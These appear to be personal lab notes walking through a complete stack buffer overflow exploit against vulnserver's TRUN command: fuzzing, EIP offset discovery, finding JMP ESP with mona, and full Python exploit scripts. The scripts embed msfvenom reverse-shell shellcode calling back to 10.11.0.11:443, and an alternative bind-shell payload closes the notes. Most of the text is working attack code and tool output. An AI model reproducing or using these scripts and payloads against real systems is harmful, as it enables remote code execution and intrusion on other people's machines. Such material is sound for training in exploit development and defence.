1. Create spike fuzzing template:

s_readline();
s_string("TRUN ");
s_string_variable("DATA");

2. Open wireshark and set disaply filter to:
tcp.port == 9999

3. Send fuzz data using:
generic_send_tcp 10.11.0.118 9999 trun.spk  0 0

4. In wireshark, locate the last successful response sent to the server using the filter:
tcp.port == 9999 and (frame contains COMPLETE)

5. Scroll the last frame listed and select it
6. Right-click > Follow > TCP Stream
7. Then increment the stream counter by 1 to proceed to the next frame. This should be the frame containg the fuzz data
which caused the server to crash

8. We see the following data without the string "TRUN Complete" which signifies the command *didn't* crash the server:

TRUN /.:/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.....

8. Note the number of bytes issued to the server using the "Entire Conversation" drop-down menu and selecting to view only the data
sent from Kali to vulnserver.

5009 bytes were sent.

9. Building the standalone python script, we get:

#!/usr/bin/python

import socket
import os
import sys

buffer="TRUN /.:/" + "A"*5009

print "[*] Sending evil TRUN request..."

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("10.11.0.118", 9999))
expl.send(buffer)
expl.close()

10. Issuing this we are able to reproduce our crash
11. Construct a UNIQUE string now of 5009 bytes long to see where the EIP reg is getting overwritten in our buffer
msf-pattern_create -l 5009

12. Plug the unique string into the buffer and reissue the crash
13. Note the bytes which have overwritten the EIp register:
386F4337 

14. Locate the offset of the bytes in the unique string:
msf-pattern_offset -q 386F4337 -l 5009
[*] Exact match at offset 2003

15. Cleanly overwrite the EIP reg by editing the python script to:

#!/usr/bin/python

import socket
import os
import sys

#[*] Exact match at offset 2003

buffer="TRUN /.:/" + "A"*2003 + "B"*4 + "C"*(5009 - 2007)

print "[*] Sending evil TRUN request..."

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("10.11.0.118", 9999))
expl.send(buffer)
expl.close()

16. Resend the payload and verify that EIP is cleanly overwritten with "42424242"
17. Reload the vulnserver and attach Immunity to it
18. Load the executable module and locate a suitable (doesn't start with 00) module in which to find a JMP ESP instruction 

19. Inside the ntdll we find:
775EC75B   FFE4             JMP ESP

20. Altneratively, usng mona.py, run:
!mona jmp -r esp -m “essfunc.dll”

21. We see the avaialble JMP ESP instructions such as:
625011AF           0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\vulnserver\essfunc.dll)
625011BB           0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\vulnserver\essfunc.dll)
625011C7           0x625011c7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\vulnserver\essfunc.dll)
625011D3           0x625011d3 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\vulnserver\essfunc.dll)
625011DF           0x625011df : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\vulnserver\essfunc.dll)
625011EB           0x625011eb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\vulnserver\essfunc.dll)
625011F7           0x625011f7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\vulnserver\essfunc.dll)
62501203           0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\vulnserver\essfunc.dll)
62501205           0x62501205 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\vulnserver\essfunc.dll)
0BADF00D             Found a total of 9 pointers
0BADF00D
0BADF00D         [+] This mona.py action took 0:00:01.344000

22. So we can also use the addresses:

625011af
625011bb
625011c7
625011d3
625011df
...

23. Replace the B characters in our payload with the memory address in little-endian format as such:
\xaf\x11\x50\x62

24. Reissue the payload and ensure we are taken to the beginning of our code cave
25. Generate reverse shell payload using:
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.11 LPORT=443 EXITFUNC=seh -b '\x00' -e x86/shikata_ga_nai -f python

buf =  ""
buf += "\xda\xd4\xbb\xd3\x50\xf1\x70\xd9\x74\x24\xf4\x5f\x31"
buf += "\xc9\xb1\x52\x31\x5f\x17\x03\x5f\x17\x83\x14\x54\x13"
buf += "\x85\x66\xbd\x51\x66\x96\x3e\x36\xee\x73\x0f\x76\x94"
buf += "\xf0\x20\x46\xde\x54\xcd\x2d\xb2\x4c\x46\x43\x1b\x63"
buf += "\xef\xee\x7d\x4a\xf0\x43\xbd\xcd\x72\x9e\x92\x2d\x4a"
buf += "\x51\xe7\x2c\x8b\x8c\x0a\x7c\x44\xda\xb9\x90\xe1\x96"
buf += "\x01\x1b\xb9\x37\x02\xf8\x0a\x39\x23\xaf\x01\x60\xe3"
buf += "\x4e\xc5\x18\xaa\x48\x0a\x24\x64\xe3\xf8\xd2\x77\x25"
buf += "\x31\x1a\xdb\x08\xfd\xe9\x25\x4d\x3a\x12\x50\xa7\x38"
buf += "\xaf\x63\x7c\x42\x6b\xe1\x66\xe4\xf8\x51\x42\x14\x2c"
buf += "\x07\x01\x1a\x99\x43\x4d\x3f\x1c\x87\xe6\x3b\x95\x26"
buf += "\x28\xca\xed\x0c\xec\x96\xb6\x2d\xb5\x72\x18\x51\xa5"
buf += "\xdc\xc5\xf7\xae\xf1\x12\x8a\xed\x9d\xd7\xa7\x0d\x5e"
buf += "\x70\xbf\x7e\x6c\xdf\x6b\xe8\xdc\xa8\xb5\xef\x23\x83"
buf += "\x02\x7f\xda\x2c\x73\x56\x19\x78\x23\xc0\x88\x01\xa8"
buf += "\x10\x34\xd4\x7f\x40\x9a\x87\x3f\x30\x5a\x78\xa8\x5a"
buf += "\x55\xa7\xc8\x65\xbf\xc0\x63\x9c\x28\xe5\x78\x9e\xa3"
buf += "\x91\x7c\x9e\xb2\xda\x08\x78\xde\x0c\x5d\xd3\x77\xb4"
buf += "\xc4\xaf\xe6\x39\xd3\xca\x29\xb1\xd0\x2b\xe7\x32\x9c"
buf += "\x3f\x90\xb2\xeb\x1d\x37\xcc\xc1\x09\xdb\x5f\x8e\xc9"
buf += "\x92\x43\x19\x9e\xf3\xb2\x50\x4a\xee\xed\xca\x68\xf3"
buf += "\x68\x34\x28\x28\x49\xbb\xb1\xbd\xf5\x9f\xa1\x7b\xf5"
buf += "\x9b\x95\xd3\xa0\x75\x43\x92\x1a\x34\x3d\x4c\xf0\x9e"
buf += "\xa9\x09\x3a\x21\xaf\x15\x17\xd7\x4f\xa7\xce\xae\x70"
buf += "\x08\x87\x26\x09\x74\x37\xc8\xc0\x3c\x49\x38\xd8\xa8"
buf += "\xde\xe3\x89\x90\x82\x13\x64\xd6\xba\x97\x8c\xa7\x38"
buf += "\x87\xe5\xa2\x05\x0f\x16\xdf\x16\xfa\x18\x4c\x16\x2f"

25. Add to python script as such:

#!/usr/bin/python

import socket
import os
import sys

#[*] Exact match at offset 2003
#625011AF   FFE4    JMP ESP, essfunc.dll

buf =  ""
buf += "\xda\xd4\xbb\xd3\x50\xf1\x70\xd9\x74\x24\xf4\x5f\x31"
buf += "\xc9\xb1\x52\x31\x5f\x17\x03\x5f\x17\x83\x14\x54\x13"
buf += "\x85\x66\xbd\x51\x66\x96\x3e\x36\xee\x73\x0f\x76\x94"
buf += "\xf0\x20\x46\xde\x54\xcd\x2d\xb2\x4c\x46\x43\x1b\x63"
buf += "\xef\xee\x7d\x4a\xf0\x43\xbd\xcd\x72\x9e\x92\x2d\x4a"
buf += "\x51\xe7\x2c\x8b\x8c\x0a\x7c\x44\xda\xb9\x90\xe1\x96"
buf += "\x01\x1b\xb9\x37\x02\xf8\x0a\x39\x23\xaf\x01\x60\xe3"
buf += "\x4e\xc5\x18\xaa\x48\x0a\x24\x64\xe3\xf8\xd2\x77\x25"
buf += "\x31\x1a\xdb\x08\xfd\xe9\x25\x4d\x3a\x12\x50\xa7\x38"
buf += "\xaf\x63\x7c\x42\x6b\xe1\x66\xe4\xf8\x51\x42\x14\x2c"
buf += "\x07\x01\x1a\x99\x43\x4d\x3f\x1c\x87\xe6\x3b\x95\x26"
buf += "\x28\xca\xed\x0c\xec\x96\xb6\x2d\xb5\x72\x18\x51\xa5"
buf += "\xdc\xc5\xf7\xae\xf1\x12\x8a\xed\x9d\xd7\xa7\x0d\x5e"
buf += "\x70\xbf\x7e\x6c\xdf\x6b\xe8\xdc\xa8\xb5\xef\x23\x83"
buf += "\x02\x7f\xda\x2c\x73\x56\x19\x78\x23\xc0\x88\x01\xa8"
buf += "\x10\x34\xd4\x7f\x40\x9a\x87\x3f\x30\x5a\x78\xa8\x5a"
buf += "\x55\xa7\xc8\x65\xbf\xc0\x63\x9c\x28\xe5\x78\x9e\xa3"
buf += "\x91\x7c\x9e\xb2\xda\x08\x78\xde\x0c\x5d\xd3\x77\xb4"
buf += "\xc4\xaf\xe6\x39\xd3\xca\x29\xb1\xd0\x2b\xe7\x32\x9c"
buf += "\x3f\x90\xb2\xeb\x1d\x37\xcc\xc1\x09\xdb\x5f\x8e\xc9"
buf += "\x92\x43\x19\x9e\xf3\xb2\x50\x4a\xee\xed\xca\x68\xf3"
buf += "\x68\x34\x28\x28\x49\xbb\xb1\xbd\xf5\x9f\xa1\x7b\xf5"
buf += "\x9b\x95\xd3\xa0\x75\x43\x92\x1a\x34\x3d\x4c\xf0\x9e"
buf += "\xa9\x09\x3a\x21\xaf\x15\x17\xd7\x4f\xa7\xce\xae\x70"
buf += "\x08\x87\x26\x09\x74\x37\xc8\xc0\x3c\x49\x38\xd8\xa8"
buf += "\xde\xe3\x89\x90\x82\x13\x64\xd6\xba\x97\x8c\xa7\x38"
buf += "\x87\xe5\xa2\x05\x0f\x16\xdf\x16\xfa\x18\x4c\x16\x2f"

buffer="TRUN /.:/" + "A"*2003 + "\xaf\x11\x50\x62" + "\x90"*16 + buf + "C"*(5009 - 2007 - 16 - len(buf))

print "[*] Sending evil TRUN request..."

expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
expl.connect(("10.11.0.119", 9999))
expl.send(buffer)
expl.close()

26. Set up a netcat listener to catch the reverse shell:
nv -nlvp 443

27. Reissue payload. Done 

---ALTERNATIVELY---

1. Generate a bind shell using:

msfvenom -p windows/shell_bind_tcp EXITFUNC=thread -b "\x00" -f python



[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 355 (iteration=0)
x86/shikata_ga_nai chosen with final size 355
Payload size: 355 bytes
Final size of python file: 1710 bytes
buf =  ""
buf += "\xdd\xc6\xbe\x3d\x26\x0a\x27\xd9\x74\x24\xf4\x5f\x29"
buf += "\xc9\xb1\x53\x31\x77\x17\x03\x77\x17\x83\xd2\xda\xe8"
buf += "\xd2\xd0\xcb\x6f\x1c\x28\x0c\x10\x94\xcd\x3d\x10\xc2"
buf += "\x86\x6e\xa0\x80\xca\x82\x4b\xc4\xfe\x11\x39\xc1\xf1"
buf += "\x92\xf4\x37\x3c\x22\xa4\x04\x5f\xa0\xb7\x58\xbf\x99"
buf += "\x77\xad\xbe\xde\x6a\x5c\x92\xb7\xe1\xf3\x02\xb3\xbc"
buf += "\xcf\xa9\x8f\x51\x48\x4e\x47\x53\x79\xc1\xd3\x0a\x59"
buf += "\xe0\x30\x27\xd0\xfa\x55\x02\xaa\x71\xad\xf8\x2d\x53"
buf += "\xff\x01\x81\x9a\xcf\xf3\xdb\xdb\xe8\xeb\xa9\x15\x0b"
buf += "\x91\xa9\xe2\x71\x4d\x3f\xf0\xd2\x06\xe7\xdc\xe3\xcb"
buf += "\x7e\x97\xe8\xa0\xf5\xff\xec\x37\xd9\x74\x08\xb3\xdc"
buf += "\x5a\x98\x87\xfa\x7e\xc0\x5c\x62\x27\xac\x33\x9b\x37"
buf += "\x0f\xeb\x39\x3c\xa2\xf8\x33\x1f\xab\xcd\x79\x9f\x2b"
buf += "\x5a\x09\xec\x19\xc5\xa1\x7a\x12\x8e\x6f\x7d\x55\xa5"
buf += "\xc8\x11\xa8\x46\x29\x38\x6f\x12\x79\x52\x46\x1b\x12"
buf += "\xa2\x67\xce\x8f\xaa\xce\xa1\xad\x57\xb0\x11\x72\xf7"
buf += "\x59\x78\x7d\x28\x79\x83\x57\x41\x12\x7e\x58\x7c\xbf"
buf += "\xf7\xbe\x14\x2f\x5e\x68\x80\x8d\x85\xa1\x37\xed\xef"
buf += "\x99\xdf\xa6\xf9\x1e\xe0\x36\x2c\x09\x76\xbd\x23\x8d"
buf += "\x67\xc2\x69\xa5\xf0\x55\xe7\x24\xb3\xc4\xf8\x6c\x23"
buf += "\x64\x6a\xeb\xb3\xe3\x97\xa4\xe4\xa4\x66\xbd\x60\x59"
buf += "\xd0\x17\x96\xa0\x84\x50\x12\x7f\x75\x5e\x9b\xf2\xc1"
buf += "\x44\x8b\xca\xca\xc0\xff\x82\x9c\x9e\xa9\x64\x77\x51"
buf += "\x03\x3f\x24\x3b\xc3\xc6\x06\xfc\x95\xc6\x42\x8a\x79"
buf += "\x76\x3b\xcb\x86\xb7\xab\xdb\xff\xa5\x4b\x23\x2a\x6e"
buf += "\x6b\xc6\xfe\x9b\x04\x5f\x6b\x26\x49\x60\x46\x65\x74"
buf += "\xe3\x62\x16\x83\xfb\x07\x13\xcf\xbb\xf4\x69\x40\x2e"
buf += "\xfa\xde\x61\x7b"
